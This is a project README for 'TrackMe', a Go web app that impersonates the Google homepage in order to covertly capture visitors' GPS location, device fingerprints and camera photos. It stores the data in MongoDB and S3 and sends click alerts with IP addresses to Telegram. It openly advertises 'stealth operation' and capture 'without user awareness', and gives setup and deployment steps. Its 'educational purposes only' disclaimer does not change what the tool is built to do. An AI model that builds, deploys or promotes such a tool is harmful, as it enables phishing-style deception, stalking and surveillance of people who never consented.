# TrackMe

A sophisticated Go-based tracking application that captures device information, geolocation, and photos from web browsers through an authentic Google homepage interface. Features advanced click tracking with real-time Telegram notifications. Data is stored in MongoDB with photo uploads to AWS S3.

## Features

- **Location Tracking**: Captures GPS coordinates from browser's geolocation API
- **Device Information**: Collects detailed device and browser information
- **Photo Capture**: Takes photos using the device's camera through web interface
- **Click Tracking**: Monitor link clicks with real-time Telegram notifications
- **Data Storage**: Stores tracking data in MongoDB
- **Photo Storage**: Uploads captured photos to AWS S3
- **Authentic Google Interface**: Pixel-perfect replica of Google homepage with responsive design
- **Stealth Operation**: Invisible tracking while users interact with familiar Google interface
- **Telegram Integration**: Real-time notifications for click tracking events

## Tech Stack

- **Backend**: Go (Golang) with Fiber v3 framework
- **Database**: MongoDB with retry connections and error handling
- **Storage**: AWS S3 for photo uploads and management
- **Frontend**: Vanilla HTML/CSS/JavaScript with authentic Google UI
- **Notifications**: Telegram Bot API integration
- **Deployment**: Railway platform with environment variables
- **Security**: CORS configuration and environment-based settings

## Project Structure

```
trackme/
├── cmd/trackme/          # Main application entry point
├── internal/
│   ├── config/           # Configuration (MongoDB, AWS S3)
│   ├── handlers/         # HTTP handlers and routes
│   ├── models/           # Data models
│   ├── repository/       # Database operations
│   └── services/         # External service integrations (Telegram)
├── web/                  # Static web assets
│   ├── index.html        # Authentic Google homepage interface
│   └── static/
│       ├── js/           # JavaScript files (location.js, photo.js)
│       └── images/       # Image assets (Google logo, etc.)
├── scripts/              # Deployment scripts
└── photos/               # Local photo storage (development)
```

## Environment Variables

Create a `.env` file for development:

```env
ENV=development
PORT=8080
MONGODB_URI=mongodb://localhost:27017/trackme
AWS_S3_REGION=your-region
AWS_ACCESS_KEY_ID=your-access-key
AWS_SECRET_ACCESS_KEY=your-secret-key
AWS_S3_BUCKET=your-bucket-name

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN=your-telegram-bot-token
TELEGRAM_CHAT_ID=your-telegram-chat-id
```

## Installation & Setup

### Prerequisites
- Go 1.24.5 or higher
- MongoDB (local or cloud instance like MongoDB Atlas)
- AWS account with S3 bucket configured
- Telegram Bot Token (optional, for click tracking)
- Railway account (for deployment)

### Local Development

1. Clone the repository:
   ```bash
   git clone https://github.com/michaelwp/trackme.git
   cd trackme
   ```

2. Install dependencies:
   ```bash
   go mod download
   ```

3. Set up environment variables (see above)

4. Build the application:
   ```bash
   make build
   ```

5. Run the application:
   ```bash
   make run
   ```

6. Access the application at `http://localhost:9000` (or your configured PORT)

### Docker Deployment

Build and run with Docker:
```bash
docker build -t trackme .
docker run -p 8080:8080 trackme
```

### Railway Deployment

The application is configured for Railway deployment with `railway.toml`. Deploy using:
```bash
./scripts/deploy-railway.sh
```

## API Endpoints

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/hello` | Health check endpoint |
| POST | `/locations` | Save location and device data |
| GET | `/locations` | Retrieve all location records |
| POST | `/locations/photos` | Upload photo files |
| GET | `/click?url=TARGET_URL` | Click tracking with Telegram notifications |

## Usage

### Web Interface
The application presents a pixel-perfect replica of the Google homepage that is indistinguishable from the real one.

**Features:**
- **Authentic Design**: Complete Google homepage UI with header, search box, buttons, and footer
- **Responsive Layout**: Mobile-friendly design that adapts to all screen sizes
- **Interactive Elements**: Functional search box, hover effects, and proper styling
- **Invisible Tracking**: Background operations capture data without user awareness

**Automatic Operations:**
1. **Geolocation Capture**: Silently requests and captures GPS coordinates
2. **Device Fingerprinting**: Collects comprehensive browser and device information
3. **Photo Capture**: Uses device camera in the background (when permissions allow)
4. **Data Storage**: All captured data is stored in MongoDB backend

### Click Tracking Feature
Create trackable links to monitor when someone clicks them:

1. **Setup Telegram Bot:**
   - Message @BotFather on Telegram
   - Create a new bot using `/newbot` command
   - Get your bot token and add it to `TELEGRAM_BOT_TOKEN`
   - Start a chat with your bot
   - Get your chat ID from `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   - Add your chat ID to `TELEGRAM_CHAT_ID`

2. **Create Trackable Links:**
   ```
   https://your-domain.com/click?url=https://example.com
   ```

3. **Receive Notifications:**
   When someone clicks the link, you'll receive a Telegram notification containing:
   - Timestamp of the click
   - Visitor's IP address
   - User agent (browser/device info)
   - Referer URL
   - Target URL they were redirected to

## Data Models

### Location Data Structure
```json
{
  "id": "unique_identifier",
  "latitude": 40.7128,
  "longitude": -74.0060,
  "accuracy": 10,
  "timestamp": "2024-08-27T10:30:00Z",
  "device_info": {
    "user_agent": "Mozilla/5.0...",
    "platform": "MacIntel",
    "language": "en-US",
    "screen": "1920x1080",
    "timezone": "America/New_York"
  },
  "network_info": {
    "ip_address": "192.168.1.1",
    "connection_type": "wifi"
  },
  "photo_info": {
    "filename": "capture-timestamp.png",
    "s3_path": "trackme/photos/...",
    "file_size": 1024000
  }
}
```

### Click Tracking Data
```json
{
  "timestamp": "2024-08-27T10:30:00Z",
  "ip_address": "192.168.1.1",
  "user_agent": "Mozilla/5.0...",
  "referer": "https://example.com",
  "target_url": "https://destination.com",
  "telegram_sent": true
}
```

### Storage Locations
- **Development**: Local `photos/` directory
- **Production**: AWS S3 with organized folder structure
- **Database**: MongoDB collections for locations and metadata

## Security Considerations

### Application Security
- **Environment Variables**: Sensitive data stored in environment variables, never in code
- **CORS Configuration**: Configurable CORS settings (currently open for development)
- **MongoDB Security**: Connection retry logic with proper error handling
- **AWS S3**: Secure credential-based file uploads with organized paths
- **Telegram API**: Secure bot token and chat ID management

### Production Recommendations
- Configure restrictive CORS origins for production deployment
- Use Railway environment variables for all sensitive data
- Monitor MongoDB connection limits and implement connection pooling
- Regular rotation of AWS access keys and Telegram bot tokens
- Implement rate limiting for API endpoints

### Privacy Considerations
- Ensure compliance with local privacy laws and regulations
- Implement proper data retention policies
- Consider user consent mechanisms where required
- Secure data transmission with HTTPS in production

## Troubleshooting

### Common Issues

**MongoDB Connection Issues:**
```bash
# Check if MongoDB URI is correctly set
echo $MONGODB_URI

# Test MongoDB connection retry logic
# The app will retry connection 3 times with backoff
```

**AWS S3 Upload Failures:**
```bash
# Verify AWS credentials
echo $AWS_ACCESS_KEY_ID
echo $AWS_S3_REGION

# Check S3 bucket permissions and CORS settings
```

**Telegram Notifications Not Working:**
```bash
# Verify bot token and chat ID
echo $TELEGRAM_BOT_TOKEN
echo $TELEGRAM_CHAT_ID

# Test bot manually
curl -X POST "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" \
     -H "Content-Type: application/json" \
     -d '{"chat_id":"'$TELEGRAM_CHAT_ID'","text":"Test message"}'
```

**Build Errors:**
```bash
# Clean and rebuild
go clean -modcache
go mod download
make build
```

## Development

### Build Commands
```bash
make build    # Build the binary
make run      # Run the application
make deploy-railway  # Deploy to Railway
```

### Project Maintenance
- Regular dependency updates with `go mod tidy`
- MongoDB index optimization for large datasets
- AWS S3 lifecycle policies for photo management
- Log rotation and monitoring setup

## Contributing

This is a demonstration project. For educational purposes:
1. Fork the repository
2. Create feature branch (`git checkout -b feature/name`)
3. Commit changes (`git commit -am 'Add feature'`)
4. Push to branch (`git push origin feature/name`)
5. Create Pull Request

## License

This project is for **educational and demonstration purposes only**. 

⚠️ **Important**: This application captures user data including location, photos, and device information. Ensure proper legal compliance and user consent before deployment in any production environment.

## Disclaimer

This software is provided for educational purposes only. Users are responsible for ensuring compliance with all applicable laws and regulations regarding privacy, data collection, and user consent in their jurisdiction.